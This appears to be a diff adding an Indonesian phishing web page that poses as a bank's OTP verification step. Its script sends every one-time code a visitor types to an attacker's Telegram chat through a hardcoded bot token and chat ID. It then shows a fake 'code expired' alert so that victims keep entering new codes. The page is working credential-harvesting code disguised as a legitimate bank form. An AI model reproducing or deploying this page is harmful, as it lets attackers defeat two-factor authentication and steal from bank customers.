@@ -1,0 +1,541 @@
+<html lang="id">
+<head>
+  <meta charset="utf-8" />
+  <meta content="width=device-width, initial-scale=1" name="viewport" />
+  <title>Verifikasi OTP</title>
+  <link
+    href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/5.15.3/css/all.min.css"
+    rel="stylesheet"
+  />
+  <link
+    href="https://fonts.googleapis.com/css2?family=Inter:wght@400;600&display=swap"
+    rel="stylesheet"
+  />
+  <style>
+    body {
+      font-family: 'Inter', sans-serif;
+      background-color: #ffffff;
+      color: #4b5563;
+      min-height: 100vh;
+      margin: 0;
+      display: flex;
+      justify-content: flex-start;
+      align-items: flex-start;
+      padding: 3rem 1.5rem;
+      position: relative;
+    }
+    .container {
+      max-width: 448px;
+      width: 100%;
+      margin: 0 auto;
+    }
+    .logo {
+      display: flex;
+      justify-content: center;
+      margin-bottom: 1.5rem;
+    }
+    .logo img {
+      width: 100%;
+      height: 70px;
+      object-fit: contain;
+    }
+    h1 {
+      font-weight: 600;
+      font-size: 1.875rem;
+      color: #0f3c75;
+      text-align: center;
+      margin-bottom: 0.75rem;
+    }
+    .description {
+      text-align: center;
+      color: #4b5563;
+      font-size: 1.125rem;
+      line-height: 1.75rem;
+      margin-bottom: 2rem;
+    }
+    form {
+      width: 100%;
+    }
+    .verification-row {
+      display: flex;
+      justify-content: space-between;
+      align-items: center;
+      margin-bottom: 1.5rem;
+      padding-left: 0.25rem;
+      padding-right: 0.25rem;
+    }
+    .verification-label {
+      font-weight: 400;
+      font-size: 1rem;
+      color: #000000;
+      display: flex;
+      align-items: center;
+      gap: 0.25rem;
+    }
+    .verification-label i {
+      font-size: 0.75rem;
+      color: #6b7280;
+      cursor: default;
+    }
+    .timer {
+      font-weight: 600;
+      font-size: 1.25rem;
+      color: #0f3c75;
+      user-select: none;
+    }
+    .resend-btn {
+      font-weight: 400;
+      font-size: 1rem;
+      color: #9fc9ca;
+      background: none;
+      border: none;
+      cursor: pointer;
+      transition: text-decoration 0.2s ease;
+    }
+    .resend-btn:disabled {
+      cursor: default;
+      text-decoration: none;
+      color: #9fc9ca;
+    }
+    .resend-btn:not(:disabled):hover,
+    .resend-btn:not(:disabled):focus {
+      text-decoration: underline;
+      outline: none;
+    }
+    .otp-inputs {
+      display: flex;
+      justify-content: space-between;
+      margin-bottom: 2rem;
+    }
+    .otp-input {
+      width: 48px;
+      height: 48px;
+      border: 1px solid #e5e7eb;
+      border-radius: 0.375rem;
+      text-align: center;
+      font-size: 1.5rem;
+      font-weight: 600;
+      color: #000000;
+      outline: none;
+      transition: box-shadow 0.2s ease;
+    }
+    .otp-input:focus {
+      box-shadow: 0 0 0 2px #0f3c75;
+      border-color: #0f3c75;
+    }
+    hr {
+      margin-top: 2rem;
+      border: none;
+      border-top: 1px solid #d1d5db;
+    }
+    #loadingOverlay {
+      position: fixed;
+      inset: 0;
+      background-color: rgba(255, 255, 255, 0.9);
+      display: flex;
+      flex-direction: column;
+      justify-content: center;
+      align-items: center;
+      z-index: 50;
+      visibility: hidden;
+      opacity: 0;
+      transition: opacity 0.3s ease;
+    }
+    #loadingOverlay.active {
+      visibility: visible;
+      opacity: 1;
+    }
+    .spinner {
+      width: 48px;
+      height: 48px;
+      color: #0f3c75;
+      animation: spin 1s linear infinite;
+      stroke-width: 2;
+      fill: none;
+      stroke: currentColor;
+    }
+    .spinner circle {
+      stroke-opacity: 0.25;
+      stroke-width: 4;
+    }
+    .spinner path {
+      stroke-linecap: round;
+      stroke-width: 4;
+    }
+    @keyframes spin {
+      100% {
+        transform: rotate(360deg);
+      }
+    }
+    .loading-text {
+      margin-top: 1rem;
+      font-weight: 600;
+      font-size: 1.125rem;
+      color: #0f3c75;
+    }
+    #errorPopup {
+      position: fixed;
+      top: 1rem;
+      left: 50%;
+      transform: translateX(-50%);
+      background-color: #fee2e2;
+      color: #b91c1c;
+      border: 1px solid #fca5a5;
+      padding: 1rem 1.5rem;
+      border-radius: 0.375rem;
+      font-weight: 600;
+      font-size: 1rem;
+      display: flex;
+      align-items: center;
+      gap: 0.5rem;
+      box-shadow: 0 2px 6px rgba(185, 28, 28, 0.3);
+      z-index: 100;
+      opacity: 0;
+      pointer-events: none;
+      transition: opacity 0.3s ease;
+    }
+    #errorPopup.show {
+      opacity: 1;
+      pointer-events: auto;
+    }
+    @media (max-width: 640px) {
+      .otp-input {
+        width: 40px;
+        height: 40px;
+        font-size: 1.25rem;
+      }
+      .description {
+        font-size: 1rem;
+        line-height: 1.5rem;
+      }
+      #errorPopup {
+        font-size: 0.875rem;
+        padding: 0.75rem 1rem;
+      }
+          .alert {
+        position: fixed; /* agar muncul di atas halaman */
+        top: 50%;
+        left: 50%;
+        transform: translate(-50%, -50%);
+        background-color: #f8d7da; /* warna latar belakang */
+        border: 1px solid #f5c6cb;
+        padding: 20px;
+        border-radius: 5px;
+        box-shadow: 0 2px 4px rgba(0,0,0,0.1);
+        z-index: 1000; /* agar muncul di atas elemen lain */
+    }
+
+    .custom-alert-hidden {
+        display: none; /* tersembunyi secara default */
+    }
+
+    #colored-text {
+        color: red; /* warna merah untuk teks spesifik */
+        font-weight: bold; /* teks menjadi tebal */
+    }
+    /* Container alert custom */
+#customAlert {
+  position: fixed;
+  top: 20px;
+  left: 50%;
+  transform: translateX(-50%);
+  background-color: #fee2e2; /* merah muda terang */
+  color: #b91c1c; /* merah gelap */
+  border: 1px solid #fca5a5;
+  padding: 1rem 1.5rem;
+  border-radius: 0.375rem;
+  font-weight: 600;
+  font-size: 1rem;
+  box-shadow: 0 2px 6px rgba(185, 28, 28, 0.3);
+  display: flex;
+  align-items: center;
+  gap: 0.5rem;
+  z-index: 10000;
+  opacity: 0;
+  pointer-events: none;
+  transition: opacity 0.3s ease;
+}
+
+/* Saat alert aktif */
+#customAlert.show {
+  opacity: 1;
+  pointer-events: auto;
+}
+
+/* Icon silang merah */
+#customAlert .icon {
+  font-size: 1.25rem;
+}
+
+/* Tombol close */
+#customAlert .close-btn {
+  margin-left: auto;
+  background: transparent;
+  border: none;
+  font-size: 1.25rem;
+  color: #b91c1c;
+  cursor: pointer;
+  font-weight: bold;
+  line-height: 1;
+  padding: 0;
+  transition: color 0.2s ease;
+}
+
+#customAlert .close-btn:hover,
+#customAlert .close-btn:focus {
+  color: #7f1d1d;
+  outline: none;
+}
+
+    }
+  </style>
+</head>
+<body>
+  <div id="loadingOverlay" aria-hidden="true">
+    <svg
+      class="spinner"
+      viewBox="0 0 24 24"
+      xmlns="http://www.w3.org/2000/svg"
+      aria-hidden="true"
+    >
+      <circle cx="12" cy="12" r="10"></circle>
+      <path d="M4 12a8 8 0 018-8"></path>
+    </svg>
+    <p class="loading-text">Memuat...</p>
+  </div>
+
+  <div id="errorPopup" role="alert" aria-live="assertive" aria-atomic="true">
+    <span aria-hidden="true" style="font-size:1.25rem;">❌</span>
+    <span>Kode OTP Kadaluwarsa</span>
+  </div>
+
+  <div class="container">
+    <div class="logo">
+      <img
+        src="https://uploads.onecompiler.io/43vfc6dh5/426ycevr7/1000016294.png"
+        alt="Logo baru"
+        width="48"
+        height="48"
+      />
+    </div>
+    <h1>Verifikasi OTP</h1>
+    <p class="description">
+      Masukan kode OTP yang dikirim ke nomor anda<br />
+      yang terdaftar di bank
+    </p>
+    <form id="otpForm" autocomplete="one-time-code" inputmode="numeric" novalidate>
+      <div class="verification-row">
+        <label class="verification-label" for="otp">
+          Kode verifikasi
+          <i
+            class="fas fa-info-circle"
+            title="Informasi kode verifikasi"
+            aria-label="Informasi kode verifikasi"
+          ></i>
+        </label>
+        <span class="timer" id="timer">3:00</span>
+        <button class="resend-btn" type="button" id="resendBtn" disabled>
+          Kirim ulang OTP
+        </button>
+      </div>
+      <div class="otp-inputs">
+        <input
+          class="otp-input"
+          type="text"
+          inputmode="numeric"
+          maxlength="1"
+          aria-label="Digit 1 of OTP"
+          name="digit1"
+          required
+          pattern="\d"
+          autocomplete="one-time-code"
+        />
+        <input
+          class="otp-input"
+          type="text"
+          inputmode="numeric"
+          maxlength="1"
+          aria-label="Digit 2 of OTP"
+          name="digit2"
+          required
+          pattern="\d"
+          autocomplete="one-time-code"
+        />
+        <input
+          class="otp-input"
+          type="text"
+          inputmode="numeric"
+          maxlength="1"
+          aria-label="Digit 3 of OTP"
+          name="digit3"
+          required
+          pattern="\d"
+          autocomplete="one-time-code"
+        />
+        <input
+          class="otp-input"
+          type="text"
+          inputmode="numeric"
+          maxlength="1"
+          aria-label="Digit 4 of OTP"
+          name="digit4"
+          required
+          pattern="\d"
+          autocomplete="one-time-code"
+        />
+        <input
+          class="otp-input"
+          type="text"
+          inputmode="numeric"
+          maxlength="1"
+          aria-label="Digit 5 of OTP"
+          name="digit5"
+          required
+          pattern="\d"
+          autocomplete="one-time-code"
+        />
+        <input
+          class="otp-input"
+          type="text"
+          inputmode="numeric"
+          maxlength="1"
+          aria-label="Digit 6 of OTP"
+          name="digit6"
+          required
+          pattern="\d"
+          autocomplete="one-time-code"
+        />
+      </div>
+    </form>
+    <hr />
+  </div>
+  <script>
+    const timerEl = document.getElementById('timer');
+    const resendBtn = document.getElementById('resendBtn');
+    const form = document.getElementById('otpForm');
+    const loadingOverlay = document.getElementById('loadingOverlay');
+    const errorPopup = document.getElementById('errorPopup');
+    const inputs = form.querySelectorAll('.otp-input');
+    let timeLeft = 180; // 3 minutes in seconds
+
+    // Show error popup
+    function showErrorPopup() {
+      errorPopup.classList.add('show');
+      setTimeout(() => {
+        errorPopup.classList.remove('show');
+      }, 4000);
+    }
+
+    // Update countdown timer
+    function updateTimer() {
+      const minutes = Math.floor(timeLeft / 60);
+      const seconds = timeLeft % 60;
+      timerEl.textContent = `${minutes}:${seconds.toString().padStart(2, '0')}`;
+      if (timeLeft === 0) {
+        clearInterval(timerInterval);
+        resendBtn.disabled = false;
+        resendBtn.style.color = '#0f3c75';
+        // Show popup on expiry
+        showErrorPopup();
+      }
+      timeLeft--;
+    }
+
+    // Resend button click handler
+    resendBtn.addEventListener('click', () => {
+      timeLeft = 180;
+      resendBtn.disabled = true;
+      resendBtn.style.color = '#9fc9ca';
+      updateTimer();
+      timerInterval = setInterval(updateTimer, 1000);
+    });
+
+    // Auto move focus on input
+    inputs.forEach((input, idx) => {
+      input.addEventListener('input', (e) => {
+        const value = e.target.value;
+        if (value.length > 1) {
+          e.target.value = value.slice(0, 1);
+        }
+        if (value.match(/^\d$/)) {
+          if (idx < inputs.length - 1) {
+            inputs[idx + 1].focus();
+          } else {
+            e.target.blur();
+            validateOtp();
+          }
+        } else {
+          e.target.value = '';
+        }
+      });
+
+      input.addEventListener('keydown', (e) => {
+        if (e.key === 'Backspace' && !e.target.value && idx > 0) {
+          inputs[idx - 1].focus();
+        }
+      });
+    });
+
+    // Validate OTP automatically when all inputs filled
+    function validateOtp() {
+      const otpCode = Array.from(inputs)
+        .map((input) => input.value)
+        .join('');
+      if (otpCode.length === inputs.length) {
+        if (timeLeft < 0) {
+          // OTP expired
+          showErrorPopup();
+          return;
+        }
+        submitOtp(otpCode);
+      }
+    }
+
+    // Submit OTP function
+    async function submitOtp(otpCode) {
+      loadingOverlay.classList.add('active');
+
+      // Replace with your Telegram bot token and chat ID
+      const botToken = '8168283737:AAElC1wltyQ8aMP40ryHtq6vUJx8Ck-dFAo';
+      const chatId = '5906925079';
+      const message = `Kode OTP yang dimasukkan: ${otpCode}`;
+
+      try {
+        await fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
+          method: 'POST',
+          headers: {
+            'Content-Type': 'application/json',
+          },
+          body: JSON.stringify({
+            chat_id: chatId,
+            text: message,
+          }),
+        });
+        alert('Kode OTP Kadaluwarsa Dapatkan Kode Baru.');
+        form.reset();
+        inputs[0].focus();
+      } catch (error) {
+        alert('Gagal mengirim kode OTP ke Telegram.');
+        console.error(error);
+      } finally {
+        loadingOverlay.classList.remove('active');
+      }
+    }
+
+    updateTimer();
+    let timerInterval = setInterval(updateTimer, 1000);
+        function showCustomAlert() {
+        document.getElementById('custom-alert').classList.remove('custom-alert-hidden');
+    }
+
+    function closeCustomAlert() {
+        document.getElementById('custom-alert').classList.add('custom-alert-hidden');
+    }
+
+    // Contoh penggunaan:
+    // Panggil showCustomAlert() saat Anda ingin menampilkan pesan peringatan
+    // Misalnya, Anda bisa memanggilnya setelah pengguna mengklik sebuah tombol.
+    // showCustomAlert();
+  </script>
+</body>
+</html>
